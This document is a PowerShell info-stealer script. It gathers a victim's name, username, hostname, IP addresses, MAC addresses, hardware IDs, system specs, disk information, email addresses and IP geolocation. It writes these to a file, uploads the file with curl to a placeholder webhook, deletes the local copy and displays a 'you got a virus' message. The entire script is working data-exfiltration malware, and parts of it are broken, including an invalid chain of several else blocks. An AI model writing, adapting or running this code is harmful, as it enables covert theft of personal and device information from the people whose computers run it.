Add-Type -AssemblyName System.Windows.Forms

$webhookURL = "YOUR WEBHOOK URL"

function diskdata {
    $disks = get-wmiobject -class "Win32_LogicalDisk" -namespace "root\CIMV2"
    $results = foreach ($disk in $disks) {
        if ($disk.Size -gt 0) {
            $SizeOfDisk = [math]::round($disk.Size/1GB, 0)
            $FreeSpace = [math]::round($disk.FreeSpace/1GB, 0)
            $usedspace = [math]::round(($disk.size - $disk.freespace) / 1GB, 2)
            [int]$FreePercent = ($FreeSpace/$SizeOfDisk) * 100
            [int]$usedpercent = ($usedspace/$SizeOfDisk) * 100
            [PSCustomObject]@{
                Drive = $disk.Name
                Name = $disk.VolumeName
                "Total Disk Size" = "{0:N0} GB" -f $SizeOfDisk 
                "Free Disk Size" = "{0:N0} GB ({1:N0} %)" -f $FreeSpace, ($FreePercent)
                "Used Space" = "{0:N0} GB ({1:N0} %)" -f $usedspace, ($usedpercent)
            }
        }
    }
    $results 
}
$alldiskinfo = diskdata | out-string 



$FullName = (Get-WmiObject Win32_UserAccount | Where-Object { $_.Name -eq $env:USERNAME }).FullName
$HostName = hostname
$UserName = $env:USERNAME
$email = $systeminfo | Select-String -Pattern '\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b' -AllMatches | ForEach-Object { $_.Matches } | Select-Object -ExpandProperty Value
$uuid = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID 
$osversion = (Get-WmiObject -class Win32_OperatingSystem).Caption
$mac = (Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where-Object{$_.IpEnabled -Match "True"} | Select-Object -Expand macaddress) -join ","
$osbuild = (Get-ItemProperty -Path c:\windows\system32\hal.dll).VersionInfo.FileVersion
$cpu = Get-WmiObject -Class Win32_Processor | Select-Object -ExpandProperty Name
$format = " GB"
$total = Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | ForEach-Object {"{0:N2}" -f ([math]::round(($_.Sum / 1GB),2))}
$raminfo = "$total" + "$format"  
$model = (Get-WmiObject -Class:Win32_ComputerSystem).Model
$gpu = (Get-WmiObject Win32_VideoController).Name
$displayversion = (Get-Item "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion").GetValue('DisplayVersion')
$pc_hwid = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID
$IPv4 = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias (Get-NetAdapter | Where-Object {$_.Status -eq 'Up'}).InterfaceAlias | Where-Object {$_.PrefixOrigin -eq 'Manual'}).IPAddress
$systeminfo = systeminfo
$IP = Invoke-RestMethod -Uri "https://ipapi.co/ip/" 

$databasePath = "user.db"

$username2 = "$IP"
$info = $true  

$url = "https://ipapi.co/$username2/json/"


$response = Invoke-WebRequest -Uri $url

if ($response.StatusCode -eq 200) {
    $result = $response.Content | ConvertFrom-Json
    
    $latitude = $result.latitude
    $city = $result.city
    $longitude = $result.longitude
    $country_name = $result.country_name

    if ($info) {

        $message = "City : $city 
latitude : $latitude 
longitude : $longitude
Country : $country_name"
    }
    else {

        $message = "latitude: $latitude"
        Invoke-WebRequest -Uri $webhookURL -Method Post -Body @{
            content = $message
        } | Out-Null  
    }
    else {

        $message = "longitude: $longitude"
        Invoke-WebRequest -Uri $webhookURL -Method Post -Body @{
            content = $message
        } | Out-Null  
    }
    else {

        $message = "Country: $country_name"
        Invoke-WebRequest -Uri $webhookURL -Method Post -Body @{
            content = $message
        } | Out-Null  
    }
}
else {
    Write-Host "ERROR : $($response.StatusCode)"
}


$data = @"
Full Name : $FullName                              
Hostname  : $HostName                              
Username  : $UserName                              
IP : $IP
IPV4 : $IPv4 
UUID : $uuid 
OS VERSION : $osversion 
MAC : $mac 
OS BUILD : $osbuild
CPU : $cpu
RAM : $raminfo
MODEL : $model
GPU : $gpu
DISPLAY VERSION : $displayversion
HWID : $pc_hwid
EMAIL : $email

$message

$alldiskinfo
"@

Add-Content -Path $databasePath -Value $data

$fichier = "user.db"
$commandeCurl = "curl.exe -s -o nul -F file1=@$fichier $webhookURL"

Invoke-Expression -Command $commandeCurl 

Remove-Item -Path "user.db"


try {
    $variableInexistante.ToUpper()
} catch {
    [System.Windows.Forms.MessageBox]::Show("you got a virus", "Malware", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
}

